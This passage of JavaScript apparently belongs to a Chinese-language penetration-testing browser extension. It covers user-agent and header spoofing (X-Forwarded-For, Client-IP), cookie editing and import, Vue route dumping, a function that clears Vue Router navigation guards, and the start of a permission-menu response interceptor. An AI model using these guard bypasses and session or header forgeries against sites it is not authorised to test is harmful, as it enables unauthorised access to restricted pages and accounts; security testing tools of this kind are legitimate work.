          'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      },
      {
        label: 'Samsung Galaxy S24',
        value:
          'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
      },
      {
        label: 'Pixel 8 Pro',
        value:
          'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
      },
      {
        label: 'Huawei Mate 60',
        value:
          'Mozilla/5.0 (Linux; Android 12; NOH-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
      },
      {
        label: 'Xiaomi 14',
        value:
          'Mozilla/5.0 (Linux; Android 14; 23127PN0CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
      },
    ],
    desktop: [
      {
        label: 'Chrome (Windows)',
        value:
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
      {
        label: 'Chrome (macOS)',
        value:
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
      {
        label: 'Firefox (Windows)',
        value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
      },
      {
        label: 'Safari (macOS)',
        value:
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
      },
      {
        label: 'Edge (Windows)',
        value:
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
      },
    ],
    brand: [
      {
        label: 'Googlebot',
        value: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
      },
      {
        label: 'Bingbot',
        value: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
      },
      {
        label: 'Facebookbot',
        value:
          'Mozilla/5.0 (compatible; FacebookExternalHit/1.1; +http://www.facebook.com/externalhit_uatext.php)',
      },
      { label: 'Twitterbot', value: 'Mozilla/5.0 (compatible; Twitterbot/1.0)' },
      {
        label: 'Baiduspider',
        value:
          'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
      },
      { label: 'curl/8.4', value: 'curl/8.4.0' },
      { label: 'Python requests', value: 'python-requests/2.31.0' },
      { label: 'Go HTTP Client', value: 'Go-http-client/1.1' },
    ],
  };

  function switchSpoofTab(tab) {
    currentSpoofTab = tab;
    document
      .querySelectorAll('.spoof-tab')
      .forEach(b => b.classList.toggle('active', b.dataset.spoof === tab));
    document.querySelectorAll('.spoof-panel').forEach(p => p.classList.remove('active'));
    const target = document.getElementById('spoof-' + tab);
    if (target) target.classList.add('active');
  }

  function renderUaList(category) {
    const container = utils.get('ua-list');
    const customGroup = utils.get('ua-custom-group');
    if (!container) return;

    if (category === 'custom') {
      container.innerHTML = '';
      customGroup.classList.remove('hidden');
      return;
    }
    customGroup.classList.add('hidden');

    const presets = UA_PRESETS[category] || [];
    if (presets.length === 0) {
      container.innerHTML = '<div class="empty-state">无预设项</div>';
      return;
    }

    let html = '';
    presets.forEach((preset, idx) => {
      const isSelected = spoofState.ua.current === preset.value;
      html +=
        '<div class="ua-item' + (isSelected ? ' ua-selected' : '') + '" data-idx="' + idx + '">';
      html += '<span class="ua-item-label">' + preset.label + '</span>';
      html += '<span class="ua-item-value" title="' + preset.value.replace(/"/g, '&quot;') + '">';
      html += preset.value.length > 80 ? preset.value.substring(0, 80) + '...' : preset.value;
      html += '</span></div>';
    });
    container.innerHTML = html;

    container.querySelectorAll('.ua-item').forEach(item => {
      item.addEventListener('click', () => {
        const i = parseInt(item.dataset.idx, 10);
        const preset = presets[i];
        if (preset) {
          utils.get('ua-custom-input').value = preset.value;
          container.querySelectorAll('.ua-item').forEach(el => el.classList.remove('ua-selected'));
          item.classList.add('ua-selected');
        }
      });
    });
  }

  function updateUaStatus() {
    const el = utils.get('spoof-ua-status');
    if (!el) return;
    el.innerHTML = spoofState.ua.enabled
      ? '<span class="spoof-status-active">UA 伪造已启用</span>'
      : '';
  }

  async function applyUserAgent() {
    const input = utils.get('ua-custom-input');
    if (!input) return;
    const ua = input.value.trim();
    if (!ua) {
      utils.showToast('请选择或输入 User-Agent', 'warning');
      return;
    }

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        utils.showToast('无法获取当前页面', 'error');
        return;
      }

      if (!spoofState.ua.enabled) {
        spoofState.ua.original = navigator.userAgent;
      }
      spoofState.ua.enabled = true;
      spoofState.ua.current = ua;

      chrome.runtime.sendMessage(
        { type: 'SPOOF_UA', tabId: tab.id, url: tab.url, userAgent: ua },
        response => {
          if (response?.success) {
            updateUaStatus();
            utils.showToast('UA 已应用', 'success');
          } else {
            utils.showToast('应用失败: ' + (response?.error || '未知错误'), 'error');
          }
        }
      );

      chrome.storage.local.set({ pentest_spoof: spoofState });
    } catch (e) {
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  async function resetUserAgent() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

      spoofState.ua.enabled = false;
      spoofState.ua.current = '';

      chrome.runtime.sendMessage({ type: 'RESET_SPOOF_UA', tabId: tab?.id }, response => {
        if (response?.success) {
          updateUaStatus();
          utils.showToast('UA 已恢复', 'success');
        } else {
          utils.showToast('恢复失败: ' + (response?.error || '未知错误'), 'error');
        }
      });

      chrome.storage.local.set({ pentest_spoof: spoofState });
    } catch (e) {
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  async function loadCookies() {
    const domainEl = utils.get('cookie-domain-info');
    const listEl = utils.get('cookie-list');
    if (!domainEl || !listEl) return;

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        domainEl.textContent = '无法获取当前页面';
        return;
      }

      const url = new URL(tab.url);
      const domain = url.hostname;
      domainEl.textContent = '当前域名: ' + domain;

      const cookies = await chrome.cookies.getAll({ domain: domain });

      if (cookies.length === 0) {
        listEl.innerHTML = '<div class="empty-state">当前域名无 Cookie</div>';
        return;
      }

      let html = '<div class="cookie-count">共 ' + cookies.length + ' 个 Cookie</div>';
      cookies.forEach(cookie => {
        html += '<div class="cookie-item" data-name="' + utils.escapeHtml(cookie.name) + '">';
        html += '<div class="cookie-item-main">';
        html += '<span class="cookie-item-name">' + utils.escapeHtml(cookie.name) + '</span>';
        html += '<span class="cookie-item-value" title="' + utils.escapeHtml(cookie.value) + '">';
        html += utils.escapeHtml(
          cookie.value.length > 60 ? cookie.value.substring(0, 60) + '...' : cookie.value
        );
        html += '</span></div>';
        html += '<div class="cookie-item-meta">';
        html +=
          '<span>' +
          utils.escapeHtml(cookie.domain || '') +
          utils.escapeHtml(cookie.path || '') +
          '</span>';
        if (cookie.httpOnly) html += '<span class="cookie-badge">HttpOnly</span>';
        if (cookie.secure) html += '<span class="cookie-badge">Secure</span>';
        html +=
          '<span class="cookie-badge">' +
          utils.escapeHtml(cookie.sameSite || 'unspecified') +
          '</span>';
        html += '</div>';
        html += '<div class="cookie-item-actions">';
        html +=
          '<button class="btn btn-sm btn-outline cookie-edit-btn" data-name="' +
          utils.escapeHtml(cookie.name) +
          '">编辑</button>';
        html +=
          '<button class="btn btn-sm btn-outline cookie-delete-btn" data-name="' +
          utils.escapeHtml(cookie.name) +
          '">删除</button>';
        html += '</div></div>';
      });
      listEl.innerHTML = html;

      listEl.querySelectorAll('.cookie-edit-btn').forEach(btn => {
        btn.addEventListener('click', () => showCookieEditor(btn.dataset.name, cookies));
      });
      listEl.querySelectorAll('.cookie-delete-btn').forEach(btn => {
        btn.addEventListener('click', () => deleteCookie(btn.dataset.name, domain));
      });

      utils.showToast('Cookie 加载完成', 'success');
    } catch (e) {
      listEl.innerHTML =
        '<div class="empty-state">加载失败: ' + utils.escapeHtml(e.message) + '</div>';
      utils.showToast('加载 Cookie 失败', 'error');
    }
  }

  function renderCookieEditor(cookieData, isNew) {
    const listEl = utils.get('cookie-list');
    if (!listEl) return;

    const c = cookieData || {};
    const title = isNew ? '添加 Cookie' : '编辑 Cookie: ' + c.name;
    const nameReadonly = isNew ? '' : ' readonly';

    let html = '<div class="cookie-editor">';
    html += '<div class="card-title">' + utils.escapeHtml(title) + '</div>';
    html += '<div class="settings-grid">';
    html +=
      '<div class="setting-item"><label>Name</label><input type="text" class="input cookie-edit-name" value="' +
      utils.escapeHtml(c.name || '') +
      '"' +
      nameReadonly +
      ' placeholder="cookie名称"></div>';
    html +=
      '<div class="setting-item"><label>Value</label><textarea class="textarea cookie-edit-value" rows="2" placeholder="cookie值">' +
      utils.escapeHtml(c.value || '') +
      '</textarea></div>';
    html +=
      '<div class="setting-item"><label>Domain</label><input type="text" class="input cookie-edit-domain" value="' +
      utils.escapeHtml((c.domain || '').replace(/^\./, '')) +
      '" placeholder="自动获取"></div>';
    html +=
      '<div class="setting-item"><label>Path</label><input type="text" class="input cookie-edit-path" value="' +
      utils.escapeHtml(c.path || '/') +
      '"></div>';
    html +=
      '<div class="setting-item"><label>Expires (秒, 0=会话)</label><input type="number" class="input cookie-edit-expires" value="' +
      (c.expirationDate ? Math.floor(c.expirationDate - Date.now() / 1000) : 0) +
      '"></div>';
    html +=
      '<div class="setting-item"><label>SameSite</label><select class="select-filter cookie-edit-samesite">';
    ['unspecified', 'no_restriction', 'lax', 'strict'].forEach(opt => {
      const sel = c.sameSite === opt || (!c.sameSite && opt === 'lax') ? ' selected' : '';
      html += '<option value="' + opt + '"' + sel + '>' + opt + '</option>';
    });
    html += '</select></div>';
    html += '</div>';
    html += '<div class="cookie-edit-flags">';
    html +=
      '<label><input type="checkbox" class="cookie-edit-httponly"' +
      (c.httpOnly ? ' checked' : '') +
      '> HttpOnly</label> ';
    html +=
      '<label><input type="checkbox" class="cookie-edit-secure"' +
      (c.secure ? ' checked' : '') +
      '> Secure</label>';
    html += '</div>';
    html += '<div class="form-actions">';
    html +=
      '<button class="btn btn-primary cookie-save-btn">' + (isNew ? '添加' : '保存') + '</button>';
    html += '<button class="btn btn-outline cookie-cancel-btn">取消</button>';
    html += '</div></div>';
    listEl.innerHTML = html;

    listEl.querySelector('.cookie-cancel-btn').addEventListener('click', () => loadCookies());
    listEl.querySelector('.cookie-save-btn').addEventListener('click', () => saveCookieEdit(isNew));
  }

  function showCookieEditor(cookieName, existingCookies) {
    const cookie = existingCookies.find(c => c.name === cookieName);
    if (!cookie) return;
    renderCookieEditor(cookie, false);
  }

  function showCookieAddEditor() {
    renderCookieEditor({}, true);
  }

  async function saveCookieEdit(isNew) {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url) return;
    const url = new URL(tab.url);

    const name = document.querySelector('.cookie-edit-name').value;
    const value = document.querySelector('.cookie-edit-value').value;
    const domain = document.querySelector('.cookie-edit-domain').value || url.hostname;
    const path = document.querySelector('.cookie-edit-path').value || '/';
    const expiresSec = parseInt(document.querySelector('.cookie-edit-expires').value, 10) || 0;
    const sameSite = document.querySelector('.cookie-edit-samesite').value;
    const httpOnly = document.querySelector('.cookie-edit-httponly').checked;
    const secure =
      document.querySelector('.cookie-edit-secure').checked || url.protocol === 'https:';

    if (!name) {
      utils.showToast('Cookie 名称不能为空', 'warning');
      return;
    }

    try {
      await chrome.cookies.set({
        url: url.origin + path,
        name: name,
        value: value,
        domain: domain,
        path: path,
        secure: secure,
        httpOnly: httpOnly,
        sameSite: sameSite,
        expirationDate: expiresSec > 0 ? Date.now() / 1000 + expiresSec : undefined,
      });
      utils.showToast('Cookie 已' + (isNew ? '添加' : '保存'), 'success');
      loadCookies();
    } catch (e) {
      utils.showToast('保存失败: ' + e.message, 'error');
    }
  }

  async function deleteCookie(cookieName) {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url) return;
    const url = new URL(tab.url);

    try {
      await chrome.cookies.remove({ url: url.origin, name: cookieName });
      utils.showToast('Cookie 已删除', 'success');
      loadCookies();
    } catch (e) {
      utils.showToast('删除失败: ' + e.message, 'error');
    }
  }

  function showCookieImportDialog() {
    const listEl = utils.get('cookie-list');
    if (!listEl) return;

    let html = '<div class="cookie-editor">';
    html += '<div class="card-title">导入 Cookie 字符串</div>';
    html += '<div class="form-group">';
    html += '<label>Cookie 字符串（name=value; name2=value2 格式）</label>';
    html +=
      '<textarea class="textarea cookie-import-textarea" rows="4" placeholder="session_id=abc123; token=eyJhbG...; user=admin"></textarea>';
    html += '</div>';
    html += '<div class="form-actions">';
    html += '<button class="btn btn-primary" id="cookie-import-do">导入</button>';
    html += '<button class="btn btn-outline cookie-cancel-btn">取消</button>';
    html += '</div></div>';
    listEl.innerHTML = html;

    listEl.querySelector('.cookie-cancel-btn').addEventListener('click', () => loadCookies());
    listEl.querySelector('#cookie-import-do').addEventListener('click', async () => {
      const text = document.querySelector('.cookie-import-textarea').value.trim();
      if (!text) {
        utils.showToast('请输入 Cookie 字符串', 'warning');
        return;
      }
      await importCookieString(text);
    });
  }

  async function importCookieString(cookieStr) {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url) return;
    const url = new URL(tab.url);
    let count = 0;

    const pairs = cookieStr
      .split(';')
      .map(s => s.trim())
      .filter(Boolean);
    for (const pair of pairs) {
      const eqIdx = pair.indexOf('=');
      if (eqIdx < 1) continue;
      const name = pair.substring(0, eqIdx).trim();
      const value = pair.substring(eqIdx + 1).trim();
      try {
        await chrome.cookies.set({
          url: url.origin,
          name: name,
          value: value,
          path: '/',
          secure: url.protocol === 'https:',
        });
        count++;
      } catch (e) {
        /* skip invalid */
      }
    }
    utils.showToast('已导入 ' + count + ' 个 Cookie', 'success');
    loadCookies();
  }

  async function clearAllCookies() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url) return;
    const url = new URL(tab.url);
    const domain = url.hostname;

    const cookies = await chrome.cookies.getAll({ domain: domain });
    let count = 0;
    for (const cookie of cookies) {
      await chrome.cookies.remove({ url: url.origin, name: cookie.name });
      count++;
    }
    utils.showToast('已清除 ' + count + ' 个 Cookie', 'success');
    loadCookies();
  }

  async function applyHeaders() {
    const xffEl = utils.get('header-xff');
    const refererPresetEl = utils.get('referer-preset');
    const refererEl = utils.get('header-referer');
    const clientIpEl = utils.get('header-client-ip');
    if (!xffEl || !refererPresetEl || !refererEl || !clientIpEl) return;

    const xff = xffEl.value.trim();
    const refererPreset = refererPresetEl.value;
    let referer = refererEl.value.trim();

    if (refererPreset === 'none') referer = '';
    else if (refererPreset === 'same') referer = 'same';
    const clientIp = clientIpEl.value.trim();

    const customHeaders = [];
    document.querySelectorAll('.custom-header-row').forEach(row => {
      const key = row.querySelector('.custom-header-key').value.trim();
      const val = row.querySelector('.custom-header-value').value.trim();
      if (key && val) customHeaders.push({ name: key, value: val });
    });

    spoofState.headers = { xff, referer, clientIp, custom: customHeaders };

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        utils.showToast('无法获取当前页面', 'error');
        return;
      }

      chrome.runtime.sendMessage(
        { type: 'SPOOF_HEADERS', tabId: tab.id, url: tab.url, headers: spoofState.headers },
        response => {
          if (response?.success) {
            utils.showToast('Header 伪造已应用', 'success');
          } else {
            utils.showToast('应用失败: ' + (response?.error || '未知错误'), 'error');
          }
        }
      );

      chrome.storage.local.set({ pentest_spoof: spoofState });
    } catch (e) {
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  function addCustomHeaderRow() {
    const container = utils.get('custom-headers');
    if (!container) return;
    const row = document.createElement('div');
    row.className = 'custom-header-row';
    row.innerHTML =
      '<input type="text" class="input custom-header-key" placeholder="Header Name">' +
      '<input type="text" class="input custom-header-value" placeholder="Header Value">' +
      '<button class="btn btn-sm btn-outline custom-header-remove" title="删除">-</button>';
    container.appendChild(row);
    row.querySelector('.custom-header-remove').addEventListener('click', () => row.remove());
  }

  async function resetHeaders() {
    const xffEl = utils.get('header-xff');
    const refererEl = utils.get('header-referer');
    const refererPresetEl = utils.get('referer-preset');
    const clientIpEl = utils.get('header-client-ip');
    const customHeadersEl = utils.get('custom-headers');
    if (xffEl) xffEl.value = '';
    if (refererEl) refererEl.value = '';
    if (refererPresetEl) refererPresetEl.value = '';
    if (clientIpEl) clientIpEl.value = '';

    if (customHeadersEl) {
      customHeadersEl.innerHTML =
        '<div class="custom-header-row">' +
        '<input type="text" class="input custom-header-key" placeholder="Header Name">' +
        '<input type="text" class="input custom-header-value" placeholder="Header Value">' +
        '<button class="btn btn-sm btn-outline custom-header-remove" title="删除">-</button></div>';
      const rmBtn = customHeadersEl.querySelector('.custom-header-remove');
      if (rmBtn)
        rmBtn.addEventListener('click', function () {
          this.closest('.custom-header-row').remove();
        });
    }

    spoofState.headers = { xff: '', referer: '', clientIp: '', custom: [] };

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      chrome.runtime.sendMessage({ type: 'RESET_SPOOF_HEADERS', tabId: tab?.id });
      chrome.storage.local.set({ pentest_spoof: spoofState });
      utils.showToast('Header 已重置', 'success');
    } catch (e) {
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  // ====== Vue Analysis ======
  let lastVueResult = '';
  let permInterceptActive = false;
  let permCapturedData = [];
  let permSelectedIndex = -1;
  let permViewMode = 'list';
  let permRefreshTimer = null;
  let lastCompareHiddenRoutes = [];
  let lastJsMatchContexts = [];
  let jsSearchFoundPaths = [];

  function startPermAutoRefresh() {
    stopPermAutoRefresh();
    permRefreshTimer = setInterval(function () {
      if (permInterceptActive && permViewMode === 'list') {
        refreshPermCaptured();
      }
    }, 2000);
  }

  function stopPermAutoRefresh() {
    if (permRefreshTimer) {
      clearInterval(permRefreshTimer);
      permRefreshTimer = null;
    }
  }

  async function detectVue() {
    const statusEl = utils.get('vue-status');
    const resultsEl = utils.get('vue-results');
    if (!statusEl || !resultsEl) return;

    statusEl.textContent = '检测中...';
    resultsEl.innerHTML = '';

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.id) {
        statusEl.textContent = '无法获取当前标签页';
        return;
      }

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: () => {
          const info = { detected: false, version: '', router: false, store: false, routes: [] };

          function safeSerialize(obj) {
            try {
              return JSON.parse(JSON.stringify(obj));
            } catch (e) {
              return null;
            }
          }

          function normalizeRoute(r) {
            return {
              path: r.path,
              name: r.name || '',
              meta: safeSerialize(r.meta) || {},
              children: [],
            };
          }

          function buildRouteTree(routes) {
            if (!routes || !Array.isArray(routes)) return [];
            return routes.map(function (r) {
              var node = normalizeRoute(r);
              if (r.children && r.children.length > 0) {
                node.children = buildRouteTree(r.children);
              }
              return node;
            });
          }

          function collectTreePaths(routes, prefix) {
            var paths = {};
            if (!routes) return paths;
            routes.forEach(function (r) {
              var p = r.path || '';
              if (p.charAt(0) !== '/' && prefix && prefix !== '/') {
                p = prefix + '/' + p;
              }
              if (r.children && r.children.length > 0) {
                var childPaths = collectTreePaths(r.children, p === '/' ? '/' : p);
                for (var k in childPaths) paths[k] = childPaths[k];
              }
              if (p) paths[p] = true;
            });
            return paths;
          }

          function getVue3Routes(router) {
            if (!router) return [];
            var treeRoutes = safeSerialize(router.options && router.options.routes) || [];
            var tree = buildRouteTree(treeRoutes);
            if (typeof router.getRoutes === 'function') {
              var flatRoutes = router.getRoutes();
              var existingPaths = collectTreePaths(tree, '');
              flatRoutes.forEach(function (r) {
                if (r.path && !existingPaths[r.path]) {
                  tree.push(normalizeRoute(r));
                }
              });
            }
            return tree;
          }

          function getVue2Routes(router) {
            if (!router) return [];
            var opts = router.options;
            var treeRoutes = opts ? safeSerialize(opts.routes) || [] : [];
            var tree = buildRouteTree(treeRoutes);
            if (typeof router.getRoutes === 'function') {
              var flatRoutes = router.getRoutes();
              var existingPaths = collectTreePaths(tree, '');
              flatRoutes.forEach(function (r) {
                if (r.path && !existingPaths[r.path]) {
                  tree.push(normalizeRoute(r));
                }
              });
            }
            return tree;
          }

          // Vue 3
          const appEl =
            document.querySelector('#app') ||
            document.querySelector('[data-v-app]') ||
            document.querySelector('[id^="app"]') ||
            document.querySelector('#root') ||
            document.querySelector('#application') ||
            document.querySelector('#main');
          if (appEl && appEl.__vue_app__) {
            const app = appEl.__vue_app__;
            info.detected = true;
            info.version = app.version || '3.x';
            const router = app.config.globalProperties.$router;
            if (router) {
              info.router = true;
              info.routes = getVue3Routes(router);
            }
            const store = app.config.globalProperties.$pinia || app.config.globalProperties.$store;
            if (store) info.store = true;
            return info;
          }

          // Broader fallback: single-pass scan for Vue 3 and Vue 2
          const allEls = document.querySelectorAll('*');
          for (const el of allEls) {
            if (el.__vue_app__) {
              const app = el.__vue_app__;
              info.detected = true;
              info.version = app.version || '3.x';
              const router = app.config.globalProperties.$router;
              if (router) {
                info.router = true;
                info.routes = getVue3Routes(router);
              }
              const store =
                app.config.globalProperties.$pinia || app.config.globalProperties.$store;
              if (store) info.store = true;
              return info;
            }
            if (el.__vue__) {
              const vm = el.__vue__.$root || el.__vue__;
              info.detected = true;
              info.version = vm.constructor.version || '2.x';
              const router = vm.$router;
              if (router) {
                info.router = true;
                info.routes = getVue2Routes(router);
              }
              if (vm.$store) info.store = true;
              return info;
            }
          }

          return info;
        },
      });

      const data = results?.[0]?.result;
      if (!data) {
        statusEl.textContent = '检测失败';
        return;
      }

      if (!data.detected) {
        statusEl.textContent = '未检测到 Vue';
        resultsEl.innerHTML = '<div class="empty-state">当前页面未使用 Vue 框架</div>';
        return;
      }

      statusEl.textContent = '检测到 Vue ' + data.version;

      let html = '';
      html +=
        '<div class="vue-info-row"><span class="vue-info-label">版本</span><span class="vue-info-value"><span class="vue-badge vue-badge-ok">Vue ' +
        utils.escapeHtml(data.version) +
        '</span></span></div>';
      html +=
        '<div class="vue-info-row"><span class="vue-info-label">Vue Router</span><span class="vue-info-value">' +
        (data.router ? '<span class="vue-badge vue-badge-ok">已检测</span>' : '未检测到') +
        '</span></div>';
      html +=
        '<div class="vue-info-row"><span class="vue-info-label">状态管理</span><span class="vue-info-value">' +
        (data.store ? '<span class="vue-badge vue-badge-warn">已检测</span>' : '未检测到') +
        '</span></div>';

      if (data.router && data.routes.length > 0) {
        html +=
          '<div class="card-spacing"><div class="card-title">路由列表 (' +
          data.routes.length +
          ')</div></div>';
        html += renderRouteTree(data.routes, 0);
      }

      resultsEl.innerHTML = html;
      lastVueResult = JSON.stringify(data, null, 2);
    } catch (e) {
      statusEl.textContent = '检测出错';
      resultsEl.innerHTML = '<div class="empty-state">' + utils.escapeHtml(e.message) + '</div>';
    }
  }

  function renderRouteTree(routes, depth) {
    let html = '';
    if (!routes || !Array.isArray(routes) || depth > 10) return html;
    routes.forEach(route => {
      html += '<div class="vue-route-item vue-depth-' + depth + '">';
      html += '<span class="vue-route-path">' + utils.escapeHtml(route.path || '/') + '</span>';
      if (route.name)
        html += '<span class="vue-route-name">' + utils.escapeHtml(route.name) + '</span>';
      if (route.meta) {
        try {
          html +=
            '<span class="vue-route-meta">meta: ' +
            utils.escapeHtml(JSON.stringify(route.meta).substring(0, 60)) +
            '</span>';
        } catch (e) {
          html += '<span class="vue-route-meta">meta: [无法序列化]</span>';
        }
      }
      html += '</div>';
      if (route.children && route.children.length > 0) {
        html += renderRouteTree(route.children, depth + 1);
      }
    });
    return html;
  }

  async function exportVueRoutes() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) return;

    try {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: () => {
          function safeSerialize(obj) {
            try {
              return JSON.parse(JSON.stringify(obj));
            } catch (e) {
              return null;
            }
          }
          function getRoutes(router) {
            if (!router) return null;
            if (typeof router.getRoutes === 'function') {
              return router.getRoutes().map(function (r) {
                return { path: r.path, name: r.name || '', meta: safeSerialize(r.meta) || {} };
              });
            }
            return router.options ? safeSerialize(router.options.routes) || null : null;
          }
          const appEl =
            document.querySelector('#app') ||
            document.querySelector('[data-v-app]') ||
            document.querySelector('[id^="app"]') ||
            document.querySelector('#root') ||
            document.querySelector('#application') ||
            document.querySelector('#main');
          if (appEl && appEl.__vue_app__) {
            var r = getRoutes(appEl.__vue_app__.config.globalProperties.$router);
            if (r) return r;
          }
          const allEls = document.querySelectorAll('*');
          for (const el of allEls) {
            if (el.__vue__) {
              const vm = el.__vue__.$root || el.__vue__;
              var r2 = getRoutes(vm.$router);
              if (r2) return r2;
            }
          }
          return null;
        },
      });

      const routes = results?.[0]?.result;
      if (!routes) {
        utils.showToast('未找到 Vue Router', 'warning');
        return;
      }

      const json = JSON.stringify(routes, null, 2);
      utils.copyText(json);
      lastVueResult = json;
      utils.showToast('路由已复制 (' + routes.length + ' 条)', 'success');
    } catch (e) {
      utils.showToast('导出失败: ' + e.message, 'error');
    }
  }

  async function bypassVueGuards() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) return;

    try {
      const bypassResults = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: () => {
          // Vue 3
          const appEl =
            document.querySelector('#app') ||
            document.querySelector('[data-v-app]') ||
            document.querySelector('[id^="app"]') ||
            document.querySelector('#root') ||
            document.querySelector('#application') ||
            document.querySelector('#main');
          if (appEl && appEl.__vue_app__) {
            const router = appEl.__vue_app__.config.globalProperties.$router;
            if (router) {
              // Vue Router 4: clear internal guard arrays
              if (Array.isArray(router.beforeGuards)) router.beforeGuards.length = 0;
              if (Array.isArray(router.afterGuards)) router.afterGuards.length = 0;
              if (Array.isArray(router.beforeResolveGuards)) router.beforeResolveGuards.length = 0;
              // Clear per-route beforeEnter guards
              if (router.options && Array.isArray(router.options.routes)) {
                (function clearRouteGuards(routes) {
                  for (var i = 0; i < routes.length; i++) {
                    if (typeof routes[i].beforeEnter === 'function') {
                      routes[i].beforeEnter = undefined;
                    }
                    if (routes[i].children) clearRouteGuards(routes[i].children);
                  }
                })(router.options.routes);
              }
              return 'vue3';
            }
          }
          // Vue 2
          const allEls = document.querySelectorAll('*');
          for (const el of allEls) {
            if (el.__vue__) {
              const vm = el.__vue__.$root || el.__vue__;
              if (vm.$router) {
                if (Array.isArray(vm.$router.beforeHooks)) vm.$router.beforeHooks.length = 0;
                if (Array.isArray(vm.$router.afterHooks)) vm.$router.afterHooks.length = 0;
                if (Array.isArray(vm.$router.beforeResolveHooks))
                  vm.$router.beforeResolveHooks.length = 0;
                return 'vue2';
              }
            }
          }
          return null;
        },
      });

      const result = bypassResults?.[0]?.result;
      if (!result) {
        utils.showToast('未找到 Vue Router', 'warning');
        return;
      }
      utils.showToast('路由守卫已清除 (Vue ' + (result === 'vue3' ? '3' : '2') + ')', 'success');
    } catch (e) {
      utils.showToast('绕过失败: ' + e.message, 'error');
    }
  }

  // ====== Vue Sub-tab Switching ======

  function switchVueSubTab(tab) {
    document.querySelectorAll('.vue-stab').forEach(function (b) {
      b.classList.toggle('active', b.dataset.vstab === tab);
    });
    document.querySelectorAll('.vue-subpanel').forEach(function (p) {
      p.classList.remove('active');
    });
    var target = document.getElementById('vstab-' + tab);
    if (target) target.classList.add('active');
  }

  // ====== Permission Menu Interceptor ======
  var permInterceptorFunc = function () {
    if (window.__PERM_INTERCEPTOR__) {
      window.__PERM_INTERCEPTOR__.active = true;
      return 'already_injected';
    }

    var MENU_KEYWORDS = [
      'menu',
      'menulist',
      'menuList',
      'menuData',
      'permission',
      'permissions',
      'permList',
      'menuIds',
      'menu_ids',
      'menuId',
      'isAdmin',
      'isadmin',
      'role',
      'roles',
      'getMenu',
      'getMenus',
      'getPermission',
      'getUserInfo',
      'navList',
      'sideMenu',
      'sidebar',
    ];

    var URL_MENU_PATTERNS = [
      /\/api\/.*menu/i,
      /\/api\/.*permission/i,
      /\/api\/.*role/i,
      /\/api\/.*user.*info/i,
      /\/api\/.*auth/i,
      /\/api\/.*nav/i,
      /\/menu(?:\/|$|[?#])/i,
      /\/permission(?:\/|$|[?#])/i,
      /\/getMenu/i,
      /\/getUserInfo/i,
      /\/getRouters/i,
      /\/getRoutes(?:\/|$|[?#])/i,
    ];

    function classifyResponse(data, url) {
      var urlLower = url.toLowerCase();
      try {
        var json = typeof data === 'string' ? JSON.parse(data) : data;
        if (json && typeof json === 'object' && !Array.isArray(json)) {
          var keys = Object.keys(json);
          for (var k = 0; k < keys.length; k++) {
            if (
              /^(isadmin|admin|is_superuser|isvip|vip|role|isSuperAdmin|userType|user_type|level|grade)$/i.test(
                keys[k]
              )
            )
              return { type: 'role', subtype: 'special_zero' };
          }
          for (var k = 0; k < keys.length; k++) {
            for (var i = 0; i < MENU_KEYWORDS.length; i++) {
              if (keys[k].toLowerCase() === MENU_KEYWORDS[i].toLowerCase())
                return { type: 'menu', subtype: null };
            }
          }
        }
      } catch (e) {}
      if (/permission/i.test(urlLower)) return { type: 'permission', subtype: null };
      if (/role/i.test(urlLower)) return { type: 'role', subtype: null };
      if (/menu/i.test(urlLower)) return { type: 'menu', subtype: null };
      return { type: 'other', subtype: null };
    }

    function parseBody(text) {
      try {
        var json = JSON.parse(text);
